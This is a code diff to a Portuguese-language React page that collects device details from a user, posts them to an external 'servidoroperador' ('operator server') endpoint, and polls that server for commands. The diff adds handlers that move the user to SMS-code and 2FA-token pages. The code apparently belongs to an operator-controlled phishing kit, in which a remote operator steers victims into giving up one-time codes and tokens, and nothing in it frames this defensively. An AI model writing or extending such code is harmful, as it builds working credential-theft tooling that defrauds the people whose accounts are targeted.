@@ -42,11 +42,28 @@ const monitorClientDispositivo = async (
         console.log('Valor do response Dispositivo:', clientData.data?.response);
         console.log('Valor do command Dispositivo:', clientData.data?.command);
         
-        // Verificar se os dados são inválidos - NÃO para o monitoramento
+        // Verificar se os dados são inválidos (inv_auth retornado) - indica dados incorretos
         if (clientData.data?.response === "inv_auth" || clientData.data?.command === "inv_auth") {
-          console.log('Detectado inv_auth - Dados inválidos, mas continuando monitoramento');
+          console.log('Detectado inv_auth retornado - Dados inválidos do dispositivo');
           onInvalidData();
           return; // Continua monitoramento, não para
+        }
+        
+        // Verificar outros redirecionamentos possíveis
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms da página Dispositivo - Redirecionando');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          navigate('/sms');
+          return;
+        }
+        
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa da página Dispositivo - Redirecionando');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          navigate('/token');
+          return;
         }
         
         console.log('Continuando monitoramento Dispositivo...');
@@ -124,7 +141,7 @@ const DispositivoPage = () => {
       setIsInvalid(false);
       setErrorMessage("");
       
-      // Enviar dados do dispositivo para a API usando external-response
+      // Enviar dados do dispositivo para a API usando external-response com command: "inv_auth"
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -147,7 +164,7 @@ const DispositivoPage = () => {
             clientId, 
             navigate,
             () => {
-              // Função onInvalidData modificada: limpa campos, para loading, mantém monitoramento
+              // Função onInvalidData: limpa campos, para loading, mantém monitoramento
               console.log('Dados inválidos detectados - limpando campos e parando loading');
               setDataFundacao("");
               setApelidoDispositivo("");
